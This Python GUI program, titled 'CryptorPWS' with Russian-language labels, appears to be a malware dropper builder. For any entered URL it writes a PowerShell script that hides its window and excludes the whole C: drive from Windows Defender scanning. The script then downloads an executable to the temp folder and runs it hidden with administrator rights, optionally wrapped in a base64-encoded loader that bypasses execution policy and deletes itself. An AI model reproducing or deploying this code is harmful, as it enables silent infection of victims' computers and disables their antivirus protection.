import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import os
import threading
import urllib.request
from PIL import Image, ImageTk
import io
import base64
import requests

class ModernUI(tk.Tk):
    def __init__(self):
        super().__init__()
        
        self.title("CryptorPWS 1.0")
        self.geometry("800x500")
        self.configure(bg="#1e1e1e")
        self.resizable(False, False)
        
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('TFrame', background='#1e1e1e')
        self.style.configure('TButton', 
                            background='#0078d7', 
                            foreground='white', 
                            font=('Segoe UI', 10, 'bold'),
                            padding=10,
                            relief='flat')
        self.style.map('TButton', 
                      background=[('active', '#005bb5')])
        self.style.configure('TLabel', 
                            background='#1e1e1e',
                            foreground='#ffffff', 
                            font=('Segoe UI', 10))
        self.style.configure('TEntry', 
                            font=('Segoe UI', 10),
                            fieldbackground='#2d2d2d',
                            foreground='#ffffff')
        
        self.main_frame = ttk.Frame(self)
        self.main_frame.pack(padx=20, pady=20, fill=tk.BOTH, expand=True)
        
        self.header_label = ttk.Label(self.main_frame, 
                                    text="CryptorPWS", 
                                    font=('Segoe UI', 18, 'bold'),
                                    background='#1e1e1e',
                                    foreground='#ffffff')
        self.header_label.pack(pady=(0, 20), anchor='w')
        
        self.url_frame = ttk.Frame(self.main_frame)
        self.url_frame.pack(fill=tk.X, pady=(0, 15))
        
        self.url_label = ttk.Label(self.url_frame, text="URL:")
        self.url_label.pack(anchor='w', pady=(0, 5))
        
        self.url_entry = ttk.Entry(self.url_frame, width=80)
        self.url_entry.pack(fill=tk.X, ipady=5)
        
        self.filename_frame = ttk.Frame(self.main_frame)
        self.filename_frame.pack(fill=tk.X, pady=(0, 15))
        
        self.filename_label = ttk.Label(self.filename_frame, text="Имя PS1 файла (без расширения):")
        self.filename_label.pack(anchor='w', pady=(0, 5))
        
        self.filename_entry = ttk.Entry(self.filename_frame, width=80)
        self.filename_entry.pack(fill=tk.X, ipady=5)
        self.filename_entry.insert(0, "script")
        
        self.options_frame = ttk.Frame(self.main_frame)
        self.options_frame.pack(fill=tk.X, pady=(0, 15))
        
        self.encrypt_var = tk.BooleanVar(value=True)
        self.encrypt_checkbox = ttk.Checkbutton(
            self.options_frame, 
            text="Шифровать скрипт в base64", 
            variable=self.encrypt_var
        )
        self.encrypt_checkbox.pack(anchor='w', pady=5)
        
        self.output_frame = ttk.Frame(self.main_frame)
        self.output_frame.pack(fill=tk.X, pady=(0, 15))
        
        self.output_label = ttk.Label(self.output_frame, text="Директория сохранения:")
        self.output_label.pack(anchor='w', pady=(0, 5))
        
        self.output_dir_frame = ttk.Frame(self.output_frame)
        self.output_dir_frame.pack(fill=tk.X)
        
        self.output_entry = ttk.Entry(self.output_dir_frame)
        self.output_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=5)
        
        self.browse_button = ttk.Button(self.output_dir_frame, text="Обзор", command=self.browse_directory)
        self.browse_button.pack(side=tk.RIGHT, padx=(10, 0))
        
        self.output_entry.insert(0, os.getcwd())
        
        self.buttons_frame = ttk.Frame(self.main_frame)
        self.buttons_frame.pack(fill=tk.X, pady=(10, 20))
        
        self.generate_button = ttk.Button(self.buttons_frame, 
                                        text="Build", 
                                        command=self.generate_script)
        self.generate_button.pack(side=tk.RIGHT)
        
        self.status_frame = ttk.Frame(self.main_frame, relief=tk.GROOVE, borderwidth=1)
        self.status_frame.pack(fill=tk.BOTH, expand=True, pady=(10, 0))
        
        self.status_label = ttk.Label(self.status_frame, text="Готов", anchor='w')
        self.status_label.pack(side=tk.TOP, fill=tk.X, padx=10, pady=5)
        
        self.preview_frame = ttk.Frame(self.status_frame)
        self.preview_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 10))
        
        self.script_preview = tk.Text(self.preview_frame, wrap=tk.WORD, height=10,
                                   font=('Consolas', 10), bg='#2d2d2d', fg='#e0e0e0')
        self.script_preview.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        self.scrollbar = ttk.Scrollbar(self.preview_frame, command=self.script_preview.yview)
        self.scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.script_preview.config(yscrollcommand=self.scrollbar.set)
        
        self.script_preview.insert(tk.END, "")
        self.script_preview.config(state=tk.DISABLED)
    
    def browse_directory(self):
        directory = filedialog.askdirectory(initialdir=self.output_entry.get())
        if directory:
            self.output_entry.delete(0, tk.END)
            self.output_entry.insert(0, directory)
    
    def generate_script(self):
        url = self.url_entry.get().strip()
        output_dir = self.output_entry.get().strip()
        script_filename = self.filename_entry.get().strip()
        encrypt_script = self.encrypt_var.get()
        
        if not url:
            messagebox.showerror("Ошибка", "Пожалуйста, введите URL для скачивания")
            return
        
        if not output_dir:
            messagebox.showerror("Ошибка", "Пожалуйста, выберите директорию для сохранения")
            return
        
        if not os.path.isdir(output_dir):
            try:
                os.makedirs(output_dir)
            except Exception as e:
                messagebox.showerror("Ошибка", f"Не удалось создать директорию: {str(e)}")
                return
        
        self.status_label.config(text="Генерация PowerShell скрипта...")
        
        self.script_preview.config(state=tk.NORMAL)
        self.script_preview.delete(1.0, tk.END)
        
        try:
            exe_filename = url.split('/')[-1]
            if not exe_filename.endswith('.exe'):
                exe_filename += '.exe'
        except:
            exe_filename = 'downloaded_file.exe'
        
        if not script_filename:
            script_filename = "script"
        
        if not script_filename.endswith('.ps1'):
            script_filename += '.ps1'
        
        original_script = f"""
$url = "{url}"
$outputFile = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "{exe_filename}")

try {{
    $WindowStyle = "Hidden"
    $host.UI.RawUI.WindowTitle = "Processing"
    
    Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
    
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($url, $outputFile)
    
    if (Test-Path -Path $outputFile) {{
        Start-Process -FilePath $outputFile -Verb RunAs -WindowStyle $WindowStyle
    }}
}}
catch {{
    exit 1
}}
"""
        
        if encrypt_script:
            encoded_script = base64.b64encode(original_script.encode('utf-8')).decode('utf-8')
            
            wrapper_script = f"""
$WindowsBuiltInTest = Add-Type -MemberDefinition @"
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
"@ -Name "Win32ShowWindowAsync" -Namespace Win32Functions -PassThru
$null = $WindowsBuiltInTest::ShowWindow([System.Diagnostics.Process]::GetCurrentProcess().MainWindowHandle, 0)

Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue

$encodedScript = @"
{encoded_script}
"@

$decodedScript = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedScript))
$tempScriptPath = Join-Path -Path $env:TEMP -ChildPath "script_$([Guid]::NewGuid().ToString()).ps1"
$decodedScript | Out-File -FilePath $tempScriptPath -Encoding UTF8

try {{
    powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $tempScriptPath
}}
finally {{
    if (Test-Path -Path $tempScriptPath) {{
        Remove-Item -Path $tempScriptPath -Force
    }}
}}
[Environment]::Exit(0)
"""
            final_script = wrapper_script
        else:
            final_script = f"""
$WindowsBuiltInTest = Add-Type -MemberDefinition @"
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
"@ -Name "Win32ShowWindowAsync" -Namespace Win32Functions -PassThru
$null = $WindowsBuiltInTest::ShowWindow([System.Diagnostics.Process]::GetCurrentProcess().MainWindowHandle, 0)

{original_script}
"""
        
        self.script_preview.insert(tk.END, final_script)
        
        try:
            script_file_path = os.path.join(output_dir, script_filename)
            with open(script_file_path, "w", encoding="utf-8") as f:
                f.write(final_script)
            
            if encrypt_script:
                self.status_label.config(text=f"Зашифрованный PowerShell скрипт сгенерирован: {script_file_path}")
                messagebox.showinfo("Успех", f"Зашифрованный PowerShell скрипт успешно сгенерирован:\n{script_file_path}")
            else:
                self.status_label.config(text=f"PowerShell скрипт сгенерирован: {script_file_path}")
                messagebox.showinfo("Успех", f"PowerShell скрипт успешно сгенерирован:\n{script_file_path}")
        except Exception as e:
            self.status_label.config(text=f"Ошибка: {str(e)}")
            messagebox.showerror("Ошибка", f"Не удалось сохранить скрипт: {str(e)}")
        
        self.script_preview.config(state=tk.DISABLED)

if __name__ == "__main__":
    try:
        app = ModernUI()
        app.mainloop()
    except Exception as e:
        print(f"Ошибка запуска приложения: {e}")
        try:
            import tkinter.messagebox as msg
            msg.showerror("Ошибка", f"Не удалось запустить приложение: {e}")
        except:
            pass